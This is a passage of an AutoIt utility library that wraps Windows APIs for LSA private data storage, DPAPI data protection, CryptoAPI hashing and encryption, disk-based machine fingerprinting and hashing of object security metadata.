	$pKeyName = _LsaInitializeBufferW($sKeyName)
	If IsPtr($sData) = 1 Then
		$pData = $sData
	Else
		$pData = _LsaInitializeBufferW(String($sData))
	EndIf
	$iResult = DllCall("Advapi32.dll", "long", "LsaStorePrivateData", "hWnd", $hPolicy, _
			"ptr", $pKeyName, "ptr", $pData)
	$pSid = _HeapFree($pData) AND _HeapFree($pKeyName)
	Return SetError(_LsaNtStatusToWinError($iResult[0]), _LsaClose($hPolicy), $iResult[0] = 0)
EndFunc	;==>_LsaStorePrivateData

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaDestroyPrivateData
; Description	: This function is used to destroy the private data.
; Parameter(s)	: $vPrimitiveData	- Specifies the primitive data to be destroied.
; Return values	: Returns the dump data if success.
; Author	: Pusofalse
; =======================================================================
Func _LsaDestroyPrivateData($vPrimitiveData)
	Local $bRandom, $hContext, $bMixEntropy

	$hContext = _CryptAcquireContext(1, 0xF0000000)
	$bRandom = _CryptGenRandom($hContext, 0x10)
	$bMixEntropy = _CryptProtectData($vPrimitiveData, $bRandom)
	Return SetError(@error, _CryptReleaseContext($hContext), $bMixEntropy)
EndFunc	;==>_LsaDestroyPrivateData

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaRetrieveFingerprint
; Description	: Retrieves the global unique fingerprint of the local system.
; Parameter(s)	: This function has no parameters.
; Return values	: If succeeds, returns the global unique fingerprint, otherwise returns NULL.
; Author	: Pusofalse
; Remarks	: The return value is protected by the private database, to decode the fingerprint, call _CryptUnprotectData function, the entropy that used to protect the data is 2nd LSA dedicated key.
; =======================================================================
Func _LsaRetrieveFingerprint()
	Local $iResult, $hDisk, $bData, $tSCIP, $tSCOP, $tQuery, $tDescr, $sGUID

	$bData = _LsaRetrievePrivateData("G$GlobalUniqueID")
	If $bData Then Return Binary(BinaryToString(StringReplace($bData, "00", "")))

	$hDisk = DllCall("Kernel32.dll", "long", "CreateFile", "str", "\\.\PhysicalDrive0", _
			"dword", bitOR($GENERIC_READ, $GENERIC_WRITE), "dword", 3, _
			"ptr", 0, "dword", 3, "dword", 0, "long", 0)
	If $hDisk[0] < 1 Then Return SetError(_GetLastError(), 0, "")
	$hDisk = $hDisk[0]

	$tSCIP = DllStructCreate("dword;byte[8];byte[4];dword[4];byte")
	$tSCOP = DllStructCreate("dword;byte[4];dword[2];char[1024]")
	$tQuery = DllStructCreate("int;int;byte")
	$tDescr = DllStructCreate("ulong[2];byte[4];ulong[4];int;ulong;byte")
	DllStructSetData($tQuery, 1, 0)
	DllStructSetData($tQuery, 2, 0)
	$iResult = DllCall("Kernel32.dll", "int", "DeviceIoControl", "long", $hDisk, "dword", 0x2D1400, _
			"ptr", DllStructGetPtr($tQuery), "dword", DllStructGetSize($tQuery), _
			"ptr", DllStructGetPtr($tDescr), "dword", DllStructGetSize($tDescr), _
			"dword*", 0, "ptr", 0)
	If $iResult[0] = 0 Then
		$iResult = _GetLastError()
		_LsaCloseHandle($hDisk)
		$bData = _FreeVariable($tQuery) AND _FreeVariable($tDescr)
		Return SetError($iResult, _FreeVariable($tSCOP) AND _FreeVariable($tSCIP), "")
	EndIf
	If DllStructGetData($tDescr, 4) = 2 Then
		DllStructSetData($tSCIP, 2, 0xA1, 7)
	Else
		DllStructSetData($tSCIP, 2, 0xEC, 7)
	EndIf
	$iResult = DllCall("Kernel32.dll", "int", "DeviceIoControl", "long", $hDisk, "dword", 0x7C088, _
			"ptr", DllStructGetPtr($tSCIP), "dword", DllStructGetSize($tSCIP), _
			"ptr", DllStructGetPtr($tSCOP), "dword", DllStructGetSize($tSCOP), _
			"dword*", 0, "ptr", 0)
	If $iResult[0] = 0 Then
		$iResult = _GetLastError()
		_LsaCloseHandle($hDisk)
		$bData = _FreeVariable($tQuery) AND _FreeVariable($tDescr)
		Return SetError($iResult, _FreeVariable($tSCOP) AND _FreeVariable($tSCIP), "")
	EndIf
	_FreeVariable($tSCIP)
	_FreeVariable($tDescr)
	_FreeVariable($tQuery)
	_LsaCloseHandle($hDisk)
	For $i = 21 To 40
		$sGUID &= DllStructGetData($tSCOP, 4, $i)
	Next
	$bData = _CryptProtectData($sGUID, $LSA_DEDICATED_KEY2, 4)
	If _LsaStorePrivateData("G$GlobalUniqueID", $bData) = 0 Then Return SetError(@error, 0, "")
	Return SetError(_FreeVariable($tSCOP), 0, $bData)
EndFunc	;==>_LsaRetrieveFingerprint

; #### FUNCTION ####
; ======================================================================================
; Name	: _CryptProtectData
; Description	: This function performs encryption on the data. Typically, only a user with the same logon credential as the encrypter can decrypt the data. In addition, the encryption and decryption usually must be done on the same computer.
; Parameter(s)	: $vDataToProtect	- Data to be encrypted.
;		: $vEntropy	- A password or other additional entropy used to encrypt the data, can be NULL.
;		: $iFlags	- This parameter can be zero or one of the following values:
;		:	- CRYPTPROTECT_LOCAL_MACHINE (4) : When this flag is set, it associates the data encrypted with the current computer instead of with an individual user. Any user on the computer on which this function is called can use _CryptUnprotectData to decryped the data.
;		:	- CRYPTPROTECT_UI_FORBIDDEN (1) : This flag is used for remote situations where presenting a user interface (UI) is not an option. When this flag is set and a UI is specified for either the protect or unprotect operation, the operation fails and _GetLastError returns the ERROR_PASSWORD_RESTRICTION.
;		:	- CRYPTPROTECT_AUDIT (16) : This flag generates an audit on protect and unprotect operations.	
;		: $sDescr	- Specifies a readable description string of the data to be encryped. This description string is included with the encrypted data. This parameter is optional, if NULL is specified, the current user's SID is used.
;		: $iPromptFlags	- Specifies the flags about where and when prompts are to be displayed and what the content of those prompts should be. If zero is specified, no prompts are displayed. This parameter can be one or more of the following values:
;		:	- 0 : No prompts.
;		:	- CRYPTPROTECT_PROMPT_ON_PROTECT (2) : This flag is used to provide the prompt for the protect phase.
;		:	- CRYPTPROTECT_PROMPT_ON_UNPROTECT (1) : This flag can be combined with CRYPTPROTECT_PROMPT_ON_PROTECT to enforce the UI (user interface) policy of the caller. When _CryptUnprotectData is called, the $iPromptFlags specified in the _CryptProtectData call are enforced.
;		: $sPrompt	- Specifies the prompt information, if $iPromptFlags is zero, this parameter is ignored.
;		: $hWndOwner	- Window handle to the parent window that owns the prompt dialog, if $iPromptFlags parameter is zero, this value should be NULL.
; Return values	: If succeeds, returns the encrypted data, else returns NULL and sets @error to the reason code of the failure.
; Author	: Pusofalse
; ======================================================================================
Func _CryptProtectData($vDataToProtect, $vEntropy = "", $iFlags = 0, $sDescr = Default, $iPromptFlags = 0, $sPrompt = "", $hWndPrompt = 0)
	Local $tEntropy, $pEntropy, $iLength, $bResult, $tResult
	Local $iResult, $tDataIn, $pDataIn, $tPrompt, $pPrompt, $iSysError

	If $sDescr = Default OR $sDescr = "" Then $sDescr = $LSA_DEDICATED_KEY0

	$iLength = StringLen($vDataToProtect) * 2 + 2
	$tDataIn = DllStructCreate($tagDATABLOB & ";wchar Data[" & $iLength & "]")
	$pDataIn = DllStructGetPtr($tDataIn)
	DllStructSetData($tDataIn, "Length", $iLength)
	DllStructSetData($tDataIn, "Buffer", DllStructGetPtr($tDataIn, "Data"))
	DllStructSetData($tDataIn, "Data", $vDataToProtect)

	Select
	Case $vEntropy <> ""
		$iLength = StringLen($vEntropy) * 2 + 2
		$tEntropy = DllStructCreate($tagDATABLOB & ";wchar Data[" & $iLength & "]")
		$pEntropy = DllStructGetPtr($tEntropy)
		DllStructSetData($tEntropy, "Length", $iLength)
		DllStructSetData($tEntropy, "Buffer", DllStructGetPtr($tEntropy, "Data"))
		DllStructSetData($tEntropy, "Data", $vEntropy)
		ContinueCase
	Case $iPromptFlags <> 0
		If $sPrompt = "" Then $sPrompt = $sDescr
		$iLength = StringLen($sPrompt) * 2 + 2
		$tPrompt = DllStructCreate($tagCRYPTPROTECT_PROMPT & ";wchar Data[" & $iLength & "]")
		$pPrompt = DllStructGetPtr($tPrompt)
		DllStructSetData($tPrompt, "Size", 16)
		DllStructSetData($tPrompt, "Flags", $iPromptFlags)
		DllStructSetData($tPrompt, "hWndOwner", $hWndPrompt)
		DllStructSetData($tPrompt, "Prompt", DllStructGetPtr($tPrompt, "Data"))
		DllStructSetData($tPrompt, "Data", $sPrompt)
	EndSelect

	$iResult = DllCall("Crypt32.dll", "int", "CryptProtectData", "ptr", $pDataIn, _
			"wstr", $sDescr, "ptr", $pEntropy, "ptr", 0, "ptr", $pPrompt, _
			"dword", $iFlags, "int64*", 0)
	If $iResult[0] = 0 Then $iSysError = _GetLastError()
	$iLength = _LsaLoLong64($iResult[7])
	$tResult = DllStructCreate("ubyte[" & $iLength & "]", _LsaHiLong64($iResult[7]))
	$bResult = DllStructGetData($tResult, 1)
	$iLength = _FreeVariable($tResult) & _FreeVariable($tPrompt)
	$iLength = _FreeVariable($tDataIn) & _FreeVariable($tEntropy)
	Return SetError($iSysError, _LsaLocalFree(_LsaHiLong64($iResult[7])), $bResult)
EndFunc	;==>_CryptProtectData

; #### FUNCTION ####
; ======================================================================================
; Name	: _CryptUnprotectData
; Description	: This function is used to decrypt the data encryped by the call to _CryptProtectData function.
; Parameter(s)	: $bProtectedData	- Encryped data, typically returned by the _CryptProtectData function.
;		: $vEntropy	- A password or other additional entropy used when the data was encryped. This parameter can be set to NULL; however, if an optional entropy was used in the encryption phase, that same entropy must be used for the decryption phase.
;		: $iFlags	- This parameter can be zero, in which case no option is set, or the following flag:
;		:	- CRYPTPROTECT_UI_FORBIDDEN (1) : This flag is used for remote situations where the user interface (UI) is not an option. When this flag is set and UI is specified for either the protect or unprotect operation, the operation fails and GetLastError returns the ERROR_PASSWORD_RESTRICTION code.
;		:	- CRYPTPROTECT_VERIFY_PROTECTION (64) : This flag verifies the protection of a protected BLOB. If the default protection level configured of the host is higher than the current protection level for the BLOB, the function returns CRYPT_I_NEW_PROTECTION_REQUIRED to advise the caller to again protect the plaintext contained in the BLOB.
;		: $iPromptFlags	- Specifies the flags about where and when prompts are to be displayed and what the content of those prompts should be. If zero is specified, no prompts are displayed. This parameter can be one or more of the following values:
;		:	- 0 : No prompts.
;		:	- CRYPTPROTECT_PROMPT_ON_PROTECT (2) : This flag is used to provide the prompt for the protect phase.
;		:	- CRYPTPROTECT_PROMPT_ON_UNPROTECT (1) : This flag can be combined with CRYPTPROTECT_PROMPT_ON_PROTECT to enforce the UI (user interface) policy of the caller. When _CryptUnprotectData is called, the $iPromptFlags specified in the _CryptProtectData call are enforced.
;		: $sPrompt	- Specifies the prompt information displayed to the user, can be set to NULL; if $iPromptFlags is zero, this parameter is ignored.
;		: $hWndPrompt	- Window handle to the parent window, if $iPromptFlags is zero, this parameter is ignored.
; Return values	: Returns the decrypted data if succeeds, else returns NULL or zero, @error is set to a system error code.
; Author	: Pusofalse
; ======================================================================================
Func _CryptUnprotectData($bProtectedData, $vEntropy = "", $iFlags = 0, $iPromptFlags = 0, $sPrompt = "", $hWndPrompt = 0)
	Local $iResult, $tDataIn, $pDataIn, $tPrompt, $pPrompt
	Local $tEntropy, $pEntropy, $iLength, $sResult, $tResult, $iSysError

	$iLength = BinaryLen($bProtectedData)
	$tDataIn = DllStructCreate($tagDATABLOB & ";ubyte Data[" & $iLength & "]")
	$pDataIn = DllStructGetPtr($tDataIn)
	DllStructSetData($tDataIn, "Length", $iLength)
	DllStructSetData($tDataIn, "Buffer", DllStructGetPtr($tDataIn, "Data"))
	DllStructSetData($tDataIn, "Data", $bProtectedData)

	Select
	Case $vEntropy <> ""
		$iLength = StringLen($vEntropy) * 2 + 2
		$tEntropy = DllStructCreate($tagDATABLOB & ";wchar Data[" & $iLength & "]")
		$pEntropy = DllStructGetPtr($tEntropy)
		DllStructSetData($tEntropy, "Length", $iLength)
		DllStructSetData($tEntropy, "Buffer", DllStructGetPtr($tEntropy, "Data"))
		DllStructSetData($tEntropy, "Data", $vEntropy)
		ContinueCase
	Case $iPromptFlags <> 0
		If $sPrompt = "" Then $sPrompt = $LSA_DEDICATED_KEY0
		$iLength = StringLen($sPrompt) * 2 + 2
		$tPrompt = DllStructCreate($tagCRYPTPROTECT_PROMPT & ";wchar Data[" & $iLength & "]")
		$pPrompt = DllStructGetPtr($tPrompt)
		DllStructSetData($tPrompt, "Size", 16)
		DllStructSetData($tPrompt, "Flags", $iPromptFlags)
		DllStructSetData($tPrompt, "hWndOwner", $hWndPrompt)
		DllStructSetData($tPrompt, "Prompt", DllStructGetPtr($tPrompt, "Data"))
		DllStructSetData($tPrompt, "Data", $sPrompt)
	EndSelect
	$iResult = DllCall("Crypt32.dll", "int", "CryptUnprotectData", "ptr", $pDataIn, _
			"ptr", 0, "ptr", $pEntropy, "ptr", 0, "ptr", $pPrompt, _
			"dword", $iFlags, "int64*", 0)
	If $iResult[0] = 0 Then $iSysError = _GetLastError()
	$iLength = _LsaLoLong64($iResult[7])
	$tResult = DllStructCreate("wchar[" & $iLength & "]", _LsaHiLong64($iResult[7]))
	$sResult = DllStructGetData($tResult, 1)
	$iLength = _FreeVariable($tResult) & _FreeVariable($tPrompt)
	$iLength = _FreeVariable($tDataIn) & _FreeVariable($tEntropy)
	Return SetError($iSysError, _LsaLocalFree(_LsaHiLong64($iResult[7])), $sResult)
EndFunc	;==>_CryptUnprotectData

Func _CryptAcquireContext($iType, $iFlag, $sContainer = "", $sProvider = "")
	Local $hContext

	$hContext = DllCall("Advapi32.dll", "int", "CryptAcquireContext", _
			"hWnd*", 0, "str", $sContainer, "str", $sProvider, _
			"dword", $iType, "dword", $iFlag)
	Return $hContext[1]
EndFunc	;==>_CryptAcquireContext

Func _CryptCreateHash($hContext, $iAlgID, $hKey = 0)
	Local $hHash
	$hHash = DllCall("Advapi32.dll", "int", "CryptCreateHash", "hWnd", $hContext, _
			"int", $iAlgID, "dword", $hKey, "dword", 0, "hWnd*", 0)
	Return $hHash[5]
EndFunc	;==>_CryptCreateHash

Func _CryptGenKey($hContext, $iAlgID, $iFlag = 0)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "int", "CryptGenKey", "hWnd", $hContext, _
			"int", $iAlgID, "dword", $iFlag, "hWnd*", 0)
	Return $iResult[4]
EndFunc	;==>_CryptGenKey

Func _CryptGenRandom($hContext, $iLength = 8)
	Local $bRandom, $tBuffer, $pBuffer, $iResult

	$iLength = Int($iLength)
	If $iLength < 1 Then $iLength = 8
	$tBuffer = DllStructCreate("ubyte Random[" & $iLength & "]")
	$iResult = DllCall("Advapi32.dll", "int", "CryptGenRandom", "hWnd", $hContext, _
			"dword", $iLength, "ptr", DllStructGetPtr($tBuffer))
	If $iResult[0] = 0 Then Return SetError(_GetLastError(), _FreeVariable($tBuffer), "")
	$bData = DllStructGetData($tBuffer, "Random")
	Return SetExtended(_FreeVariable($tBuffer), $bData)
EndFunc	;==>_CryptGenRandom

Func _CryptHashData($hHash, $pBuffer, $iSizeofBuffer, $iFlag)
	Local $iResult

	If IsDllStruct($pBuffer) Then $pBuffer = DllStructGetPtr($pBuffer)
	$iResult = DllCall("Advapi32.dll", "int", "CryptHashData", "hWnd", $hHash, _
			"ptr", $pBuffer, "dword", $iSizeofBuffer, "dword", $iFlag)
	Return $iResult[0] <> 0
EndFunc	;==>_CryptHashData

Func _CryptGetHashParam($hHash, $iParamRequires)
	Local $iResult, $tBuffer, $pBuffer, $bData

	$iResult = DllCall("Advapi32.dll", "int", "CryptGetHashParam", "hWnd", $hHash, _
			"dword", $iParamRequires, "ptr", 0, "int*", 0, "int", 0)
	$tBuffer = DllStructCreate("byte[" & $iResult[4] & "]")
	$pBuffer = DllStructGetPtr($tBuffer)
	$iResult = DllCall("Advapi32.dll", "int", "CryptGetHashParam", "hWnd", $hHash, _
			"dword", $iParamRequires, "ptr", $pBuffer, _
			"int*", $iResult[4], "int", 0)
	$bData = DllStructGetData($tBuffer, 1)
	_FreeVariable($tBuffer)
	Return SetExtended($iResult[0], $bData)
EndFunc	;==>_CryptGetHashParam

Func _CryptReleaseContext($hContext)
	Local $iResult = DllCall("Advapi32.dll", "int", "CryptReleaseContext", "hWnd", $hContext, "dword", 0)
	Return $iResult[0] <> 0
EndFunc	;==>_CryptReleaseContext

Func _CryptDestroyHash($hHash)
	Local $iResult = DllCall("Advapi32.dll", "int", "CryptDestroyHash", "hWnd", $hHash)
	Return $iResult[0] <> 0
EndFunc	;==>_CryptDestroyHash

Func _CryptDestroyKey($hKey)
	Local $iResult = DllCall("Advapi32.dll", "int", "CryptDestroyKey", "hWnd", $hKey)
	Return $iResult[0] <> 0
EndFunc	;==>_CryptDestroyKey

Func _CryptDuplicateHash($hHash)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "int", "CryptDuplicateHash", "hWnd", $hHash, _
			"ptr", 0, "dword", 0, "hWnd*", 0)
	Return SetExtended($iResult[0], $iResult[4])
EndFunc	;==>_CryptDuplicateHash

Func _CryptDuplicateKey($hKey)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "int", "CryptDuplicateKey", "hWnd", $hKey, _
			"ptr", 0, "dword", 0, "hWnd*", 0)
	Return SetExtended($iResult[0], $iResult[4])
EndFunc	;==>_CryptDuplicateKey

Func _CryptEncrypt($sBinData, $hKey, $hHash = 0)
	Local $iResult, $iLength, $tBuffer, $pBuffer, $tEncode, $pEncode, $bData

	$iLength = BinaryLen($sBinData)
	$tBuffer = DllStructCreate("byte[" & $iLength & "]")
	$pBuffer = DllStructGetPtr($tBuffer)
	DllStructSetData($tBuffer, 1, $sBinData)

	$iResult = DllCall("Advapi32.dll", "int", "CryptEncrypt", "hWnd", $hKey, _
			"hWnd", $hHash, "int", 1, "dword", 0, "ptr", $pBuffer, _
			"dword*", $iLength, "dword", $iLength)
	_FreeVariable($tBuffer)
	$tEncode = DllStructCreate("byte[" & $iResult[6] & "]")
	$pEncode = DllStructGetPtr($tEncode)
	DllStructSetData($tEncode, 1, $sBinData)
	$iResult = DllCall("Advapi32.dll", "int", "CryptEncrypt", "hWnd", $hKey, _
			"hWnd", $hHash, "int", 1, "dword", 0, "ptr", $pEncode, _
			"dword*", $iLength, "dword", $iResult[6])
	$bData = DllStructGetData($tEncode, 1)
	_FreeVariable($tEncode)
	Return SetExtended($iResult[0], $bData)
EndFunc	;==>_CryptEncrypt

Func _CryptDecrypt($bBinData, $hKey, $hHash = 0)
	Local $iResult, $iLength, $tDecode, $pDecode, $tBuffer, $pBuffer, $bData

	$iLength = BinaryLen($bBinData)
	$tBuffer = DllStructCreate("byte[" & $iLength & "]")
	$pBuffer = DllStructGetPtr($tBuffer)
	DllStructSetData($tBuffer, 1, $bBinData)

	$iResult = DllCall("Advapi32.dll", "int", "CryptDecrypt", "hWnd", $hKey, _
			"hWnd", $hHash, "int", 1, "dword", 0, _
			"ptr", $pBuffer, "dword*", $iLength)
	$tDecode = DllStructCreate("byte[" & $iResult[6] & "]", $pBuffer)
	$bData = DllStructGetData($tDecode, 1)
	_FreeVariable($tBuffer)
	_FreeVariable($tDecode)
	Return SetExtended($iResult[0], $bData)
EndFunc	;==>_CryptDecrypt

Func _CryptHashCertificate($sBinData, $iAlgID = $CALG_MD5)
	Local $tBuffer, $pBuffer, $iLength, $iResult, $tHash, $pHash, $bData

	$iLength = BinaryLen($sBinData)
	$tBuffer = DllStructCreate("byte[" & $iLength & "]")
	$pBuffer = DllStructGetPtr($tBuffer)
	DllStructSetData($tBuffer, 1, $sBinData)

	$iResult = DllCall("Crypt32.dll", "int", "CryptHashCertificate", "hWnd", 0, _
			"dword", $iAlgID, "dword", 0, "ptr", $pBuffer, _
			"dword", $iLength, "ptr", 0, "dword*", 0)
;			MsgBox(1, '', @error)
	$tHash = DllStructCreate("byte[" & $iResult[7] & "]")
	$pHash = DllStructGetPtr($tHash)
	$iResult = DllCall("Crypt32.dll", "int", "CryptHashCertificate", "hWnd", 0, _
			"dword", $iAlgID, "dword", 0, "ptr", $pBuffer, _
			"dword", $iLength, "ptr", $pHash, "dword*", $iResult[7])
	$bData = StringTrimLeft(DllStructGetData($tHash, 1), 2)
	_FreeVariable($tHash)
	_FreeVariable($tBuffer)
	Return SetExtended($iResult[0], StringLower($bData))
EndFunc	;==>_CryptHashCertificate

Func _CryptStringToBinary($sString, $iFlag = 1)
	Local $iResult, $tBuffer, $pBuffer, $iLength, $bData

	$iLength = BinaryLen($sString)
	$iResult = DllCall("Crypt32.dll", "int", "CryptStringToBinary", _
			"str", $sString, "dword", $iLength, "dword", $iFlag, _
			"ptr", 0, "dword*", 0, "dword*", 0, "dword*", 0)
	$tBuffer = DllStructCreate("char[" & $iResult[5] & "]")
	$pBuffer = DllStructGetPtr($tBuffer)
	$iResult = DllCall("Crypt32.dll", "int", "CryptStringToBinary", _
			"str", $sString, "dword", $iLength, "dword", $iFlag, _
			"ptr", $pBuffer, "dword*", $iResult[5], "dword*", 0, "dword*", 0)
	$bData = DllStructGetData($tBuffer, 1)
	_FreeVariable($tBuffer)
	Return SetExtended($iResult[0], $bData)
EndFunc	;==>_CryptStringToBinary

Func _CryptBinaryToString($sBinData, $iFlag = 1)
	Local $iResult, $iLength

	$iLength = BinaryLen($sBinData)
	$iResult = DllCall("Crypt32.dll", "int", "CryptBinaryToString", "str", $sBinData, _
			"dword", $iLength, "dword", $iFlag, "ptr", 0, "dword*", 0)
	$iResult = DllCall("Crypt32.dll", "int", "CryptBinaryToString", "str", $sBinData, _
			"dword", $iLength, "dword", $iFlag, _
			"str", "", "dword*", $iResult[5])
	Return SetExtended($iResult[0], $iResult[4])
EndFunc	;==>_CryptBinaryToString

; #### FUNCTION ####
; =======================================================================
; Name	: _CryptVerifyObjectHashValue
; Description	: Verify the hash value of the specified object.
; Parameter(s)	: $sObject		- Specify the name of the object to verify.
;		: $iType		- Specify the object type, see CRYPT_OBJECT_* GLOBAL CONSTants for a value.
;		: $iMask		- Specify a bit of verifier flag, see CRYPT_MASK_* GLOBAL CONSTants for a value.
;		: $iAlgID		- The verifier method, default to verify using MD5.
; Return values	: If succeeds, returns the hash value in string format. Otherwise, returns NULL and sets @error.
; Author	: Pusofalse
; Remarks		: $iType - $CRYPT_OBJECT_FILE.
;		:	$CRYPT_MASK_OWNER, if the owner of the file has changed, the hash value is changed too.
;		:	$CRYPT_MASK_GROUP, if the primary group of the file has changed, the hash value is changed too.
;		:	$CRYPT_MASK_DACL, if the DACL security information has changed, the hash value is changed too.
;		:	$CRYPT_MASK_DATA, if the data of the file has changed, the hash value is changed too.
;		:	$CRYPT_MASK_TIME, if the modification time of the file has changed, the hash value is changed too.
;		:	$CRYPT_MASK_ATTRIBUTES, if the attribute of the file has changed, the hash value is changed too.
;		:	$CRYPT_MASK_SYNCHRONIZE, if the type, display name or system icon index have changed, the hash value is changed too.
;		: $iType - $CRYPT_OBJECT_SERVICE
;		:	$CRYPT_MASK_OWNER, if the owner of the service has changed, the hash value is changed too.
;		:	$CRYPT_MASK_GROUP, if the primary group of the service has changed, the hash value is changed too.
;		:	$CRYPT_MASK_DACL, if the DACL security information of the service has changed, the hash value is changed too.
;		:	$CRYPT_MASK_SACL, if the SACL security information of the service has changed, the hash value is changed too.
;		:	$CRYPT_MASK_TYPE, if the type or start type have changed, the hash value is changed too.
;		:	$CRYPT_MASK_STATE, if the state of the service has changed, the hash value is changed too.
;		:	$CRYPT_MASK_SYNCHRONIZE, if the type, start type, error control code, binary path, load order group, tag ID, dependent services, start name, or display name of the service have changed, the hash value is changed too.
;		:	$CRYPT_MASK_PARAM, if the status of the service has changed, the hash value is changed.
;		:	$CRYPT_MASK_DATA, if the data in the binary file of the service has changed, the hash is chenged, if the service does not have  an executable command, this flag is ignored.
;		:	$CRYPT_MASK_TIME, if the time of the binary file of the service has changed, the hash is chenged, if the service does not have  a executable command, this flag is ignored.
;		:	$CRYPT_MASK_ATTRIBUTES, if the attribute of the binary file of the service has changed, the hash is changed, if the service does not have an executable command, this flag is ignored.
;		: $iType - $CRYPT_OBJECT_REGISTRY_KEY
;			$CRYPT_MASK_OWNER, if the owner of the registry key has changed, the hash value is changed also.
;		:	$CRYPT_MASK_GROUP, if the primary group of the registry key has changed, the hash value is changed also.
;		:	$CRYPT_MASK_DACL, if the DACL security information of the registry key has changed, the hash value is changed also.
;		: $iType - $CRYPT_OBJECT_STRING
;		:	If $iType is CRYPT_OBJECT_STRING, the function ignores the $iType and $iMask parameters, returns the hash value of the string.
;		: $iType - $CRYPT_OBJECT_KERNEL
;		:	$CRYPT_MASK_OWNER, if the owner of the kernel object has changed, the hash is changed also.
;		:	$CRYPT_MASK_GROUP, if the primary group of the kernel object has changed, the hash is changed also.
;		:	$CRYPT_MASK_DACL, if the DACL security information of the kernel object has changed, the hash is changed also.
; =======================================================================
Func _CryptVerifyObjectHashValue($sObject, $iType, $iMask, $iAlgID = $CALG_MD5)
	Local $sBinData, $pSecurDesc, $hToken = _OpenProcessToken(-1), $iAccess, $bHash, $aResult
	Local $aPriv[2][2] = [[$SE_SECURITY_NAME, 2], [$SE_DEBUG_NAME, 2]], $aAceList, $tBuffer

	If bitAND($iMask, $CRYPT_MASK_DACL) OR bitAND($iMask, $CRYPT_MASK_SACL) Then
		_AdjustTokenPrivileges($hToken, $aPriv)
	EndIf
	_LsaCloseHandle($hToken)

	Switch $iType
	Case $CRYPT_OBJECT_STRING
		$iMask = $CRYPT_MASK_SELF
	Case $CRYPT_OBJECT_FILE
		If Not FileExists($sObject) Then Return SetError(2, 0, "")
		If bitAND($iMask, $CRYPT_MASK_OWNER) AND Not _IsNtfs($sObject) Then Return SetError(@error, 0, "")
		If bitAND($iMask, $CRYPT_MASK_GROUP) AND Not _IsNtfs($sObject) Then Return SetError(@error, 0, "")
		If bitAND($iMask, $CRYPT_MASK_DACL) AND Not _IsNtfs($sObject) Then Return SetError(@error, 0, "")

		If bitAND($iMask, $CRYPT_MASK_TIME) Then $sBinData &= FileGetTime($sObject, 0, 1)
		If bitAND($iMask, $CRYPT_MASK_DATA) Then $sBinData &= FileRead(FileOpen($sObject, 16))
		If bitAND($iMask, $CRYPT_MASK_ATTRIBUTES) Then $sBinData &= FileGetAttrib($sObject)

		If bitAND($iMask, $CRYPT_MASK_OWNER) Then $iAccess = bitOR($iAccess, $OWNER_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_GROUP) Then $iAccess = bitOR($iAccess, $GROUP_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_DACL) Then $iAccess = bitOR($iAccess, $DACL_SECURITY_INFORMATION)
		$pSecurDesc = _QueryFileSecurity($sObject, $iAccess)
		If bitAND($iMask, $CRYPT_MASK_OWNER) Then $sBinData &= _ConvertSidToStringSid(_GetSecurityDescriptorOwner($pSecurDesc))
		If bitAND($iMask, $CRYPT_MASK_GROUP) Then $sBinData &= _ConvertSidToStringSid(_GetSecurityDescriptorGroup($pSecurDesc))
		If bitAND($iMask, $CRYPT_MASK_DACL) Then
			$aAceList = _GetExplicitEntriesFromAcl(_GetSecurityDescriptorDacl($pSecurDesc))
			For $i = 1 to $aAceList[0][0]
				For $c = 0 to 4
					$sBinData &= $aAceList[$i][$c]
				Next
			Next
		EndIf
		If bitAND($iMask, $CRYPT_MASK_SYNCHRONIZE) Then
			$tBuffer = _SHGetFileInfo($sObject)
			$sBinData &= DllStructGetData($tBuffer, 1)
			_FreeVariable($tBuffer)
		EndIf
	Case $CRYPT_OBJECT_REGISTRY_KEY
		Local $hMainKey, $sSubKey
		$sObject = StringSplit($sObject, "\")
		If $sObject[0] = 0 Then Return SetError($ERROR_INVALID_PARAMETER, 0, "")
		Switch $sObject
		Case "HKCR", "HKEY_CLASSES_ROOT"
			$hMainKey = 0x80000000
		Case "HKCU", "HKEY_CURRENT_USER"
			$hMainKey = 0x80000001
		Case "HKLM", "HKEY_LOCAL_MACHINE"
			$hMainKey = 0x80000002
		Case "HKU", "HKEY_USERS"
			$hMainKey = 0x80000003
		Case "HKCC", "HKEY_CURRENT_CONFIG"
			$hMainKey = 0x80000005
		Case Else
			Return SetError($ERROR_INVALID_PARAMETER,0, "")
		EndSwitch
		For $i = 2 to $sObject[0]
			$sSubKey &= $sObject[$i] & "\"
		Next

		If bitAND($iMask, $CRYPT_MASK_OWNER) Then $iAccess = bitOR($iAccess, $OWNER_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_GROUP) Then $iAccess = bitOR($iAccess, $GROUP_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_DACL) Then $iAccess = bitOR($iAccess, $DACL_SECURITY_INFORMATION)
		$pSecurDesc = _RegGetKeySecurity($sObject, $iAccess)
		If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, "")
		If bitAND($iMask, $CRYPT_MASK_OWNER) Then $sBinData &= _ConvertSidToStringSid(_GetSecurityDescriptorOwner($pSecurDesc))
		If bitAND($iMask, $CRYPT_MASK_GROUP) Then $sBinData &= _ConvertSidToStringSid(_GetSecurityDescriptorGroup($pSecurDesc))
		If bitAND($iMask, $CRYPT_MASK_DACL) Then
			$aAceList = _GetExplicitEntriesFromAcl(_GetSecurityDescriptorDacl($pSecurDesc))
			For $i = 1 to $aAceList[0][0]
				For $c = 0 to 4
					$sBinData &= $aAceList[$i][$c]
				Next
			Next
		EndIf
	Case $CRYPT_OBJECT_LMSHARE, $CRYPT_OBJECT_KERNEL
		If bitAND($iMask, $CRYPT_MASK_OWNER) Then $iAccess = bitOR($iAccess, $OWNER_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_GROUP) Then $iAccess = bitOR($iAccess, $GROUP_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_DACL) Then $iAccess = bitOR($iAccess, $DACL_SECURITY_INFORMATION)
		If $iType = $CRYPT_OBJECT_LMSHARE Then
			$aSecur = _GetNamedSecurityInfo($sObject, $SE_LMSHARE, $iAccess)
		Else
